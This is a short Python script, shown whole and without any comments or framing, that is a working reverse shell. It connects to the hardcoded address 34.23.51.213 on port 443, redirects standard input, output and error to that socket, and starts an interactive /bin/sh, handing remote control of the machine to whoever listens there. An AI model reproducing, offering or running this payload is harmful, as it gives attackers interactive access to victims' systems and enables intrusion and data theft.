import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("34.23.51.213",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
